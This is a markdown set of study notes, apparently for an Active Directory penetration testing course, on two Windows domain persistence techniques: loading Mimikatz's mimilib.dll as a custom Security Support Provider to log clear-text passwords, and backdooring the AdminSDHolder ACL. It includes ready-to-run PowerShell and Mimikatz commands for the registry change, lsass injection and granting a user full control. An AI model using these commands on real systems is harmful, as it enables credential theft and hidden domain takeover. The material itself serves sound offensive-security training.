# Persistence – Custom SSP
```
Security Support Provider (SSP) typically refers to a software module in Microsoft Windows operating systems. 
SSPs play a crucial role in the authentication and security of Windows systems. They are responsible for 
implementing various security protocols and handling authentication mechanisms.

Examples of SSPs in Windows include NTLM (NT LAN Manager), Kerberos, and Security Support Provider Interface (SSPI).
 Each SSP provides a specific set of security services, and the choice of SSP can impact how authentication and 
security are handled in a Windows environment.
```
- A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection. Some SSP Packages by Microsoft are
  - NTLM
  - Kerberos
  - Wdigest
  - CredSSP
- Mimikatz provides a custom SSP - mimilib.dll. This SSP logs local logons, service account and machine account passwords in clear text on the target server.
- Drop the mimilib.dll to system32 and add mimilib to ```HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages```:
```
$packages = Get-ItemProperty
HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security
Packages'| select -ExpandProperty 'Security Packages'
$packages += "mimilib"
Set-ItemProperty
HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security
Packages' -Value $packages
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name
'Security Packages' -Value $packages
```
- Using mimikatz, inject into lsass (Not stable with Server 2016 and Server 2019): <br>
``` Invoke-Mimikatz -Command '"misc::memssp"' ```
- All local logons on the DC are logged to ```C:\Windows\system32\kiwissp.log```:
![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/54d7da1b-4b28-4fbe-aae1-ff414bbf168d)

# Persistence using ACLs – AdminSDHolder
-  Resides in the System container of a domain and used to control the permissions - using an ACL - for certain built-in privileged groups (called Protected Groups).
- Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL.
- Protected Groups
![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/7980542d-3e42-40fe-ad95-8e9319b92cb6)
- Well known abuse of some of the Protected Groups - All of the below can log on locally to DC
![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/d1b452f9-2fc6-4b03-b7bf-7d3824cf09df)
- With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object.
- In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it.
- Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:
```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dcdollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -
Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomaindollarcorp.moneycorp.local -Verbose
```
- • Using ActiveDirectory Module and RACE toolkit ```(https://github.com/samratashok/RACE)```: <br>
```
Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -Right GenericAll -DistinguishedName
'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Verbose
```
